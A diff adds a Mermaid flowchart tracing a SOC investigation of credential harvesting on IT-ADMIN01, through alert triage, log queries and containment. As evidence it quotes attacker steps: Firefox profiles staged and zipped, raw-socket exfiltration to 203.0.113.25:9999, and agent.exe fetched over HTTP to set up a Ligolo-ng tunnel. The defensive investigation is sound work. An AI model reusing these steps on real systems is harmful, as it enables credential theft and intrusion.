@@ -1,0 +1,60 @@
+graph TD
+    %% -------------------------------------------------------------
+    %% CASE 003: CREDENTIAL HARVESTING & STAGING INVESTIGATION FLOW
+    %% -------------------------------------------------------------
+
+    subgraph TRIAGE["1. INITIAL ALERT TRIAGE"]
+        ALERT_A06["ESM Alert: A06 Credential Collection<br/>Severity: 8 (High)<br/>Target: Firefox\\Profiles on IT-ADMIN01"]
+        VERIFY_XCOPY["Inspect Sysmon Event ID 1<br/>Binary: xcopy.exe<br/>Target: C:\\Users\\Public\\firefox_profile\\"]
+    end
+
+    subgraph PIVOT_STAGING["2. DATA STAGING & COMPRESSION (LOGGER)"]
+        QUERY_PS_COMP["Logger Query: PowerShell 4104<br/>Search Compress-Archive on IT-ADMIN01"]
+        EVID_ZIP["Found Staged Archive<br/>File: C:\\Users\\Public\\firefox_profile.zip"]
+    end
+
+    subgraph PIVOT_EXFIL["3. RAW SOCKET EXFILTRATION (LOGGER)"]
+        QUERY_PS_TCP["Logger Query: PowerShell 4104<br/>Search TcpClient & Socket streams"]
+        EVID_TCP["Found Raw Socket Script<br/>New-Object System.Net.Sockets.TcpClient<br/>Target: 203.0.113.25:9999"]
+        VERIFY_FLOW["Cross-Verify with Zeek conn.log<br/>Flow on port 9999: 1.48 MB transferred"]
+    end
+
+    subgraph PIVOT_TOOL["4. TOOL INGRESS INVESTIGATION (LOGGER)"]
+        ALERT_A08["ESM Alert: A08 Tool Transfer<br/>Target: agent.exe"]
+        QUERY_PS_DL["Logger Query: PowerShell 4104<br/>Invoke-WebRequest http://203.0.113.25:8080/agent.exe"]
+        VERIFY_TUNNEL["Sysmon Event ID 1 & 3: agent.exe<br/>Connected to 203.0.113.25:11601<br/>Foothold Weaponized via Ligolo-ng"]
+    end
+
+    subgraph RESPONSE["5. CONTAINMENT & HARDENING"]
+        ACL_PUBLIC["Lock Down C:\\Users\\Public\\ ACLs<br/>Block Execution & Non-Admin Write"]
+        REVOKE_CREDS["Emergency Credential Revocation<br/>Reset Passwords for All Discovered Accounts"]
+        BLOCK_PORTS["Perimeter Egress Enforcement<br/>Block Outbound Ports 9999 & 11601"]
+    end
+
+    %% Flow connections
+    ALERT_A06 --> VERIFY_XCOPY
+    VERIFY_XCOPY --> QUERY_PS_COMP
+    QUERY_PS_COMP --> EVID_ZIP
+    EVID_ZIP --> QUERY_PS_TCP
+    QUERY_PS_TCP --> EVID_TCP
+    EVID_TCP --> VERIFY_FLOW
+
+    VERIFY_FLOW --> ALERT_A08
+    ALERT_A08 --> QUERY_PS_DL
+    QUERY_PS_DL --> VERIFY_TUNNEL
+
+    VERIFY_FLOW --> REVOKE_CREDS
+    VERIFY_TUNNEL --> ACL_PUBLIC
+    VERIFY_TUNNEL --> BLOCK_PORTS
+
+    classDef alert fill:#ffebee,stroke:#c62828,stroke-width:2px,color:#b71c1c;
+    classDef staging fill:#e1f5fe,stroke:#0288d1,stroke-width:1px,color:#01579b;
+    classDef exfil fill:#f3e5f5,stroke:#7b1fa2,stroke-width:1px,color:#4a148c;
+    classDef tool fill:#fff3e0,stroke:#e65100,stroke-width:1px,color:#bf360c;
+    classDef response fill:#e8f5e9,stroke:#2e7d32,stroke-width:2px,color:#1b5e20;
+
+    class ALERT_A06,ALERT_A08 alert;
+    class VERIFY_XCOPY,QUERY_PS_COMP,EVID_ZIP staging;
+    class QUERY_PS_TCP,EVID_TCP,VERIFY_FLOW exfil;
+    class QUERY_PS_DL,VERIFY_TUNNEL tool;
+    class ACL_PUBLIC,REVOKE_CREDS,BLOCK_PORTS response;
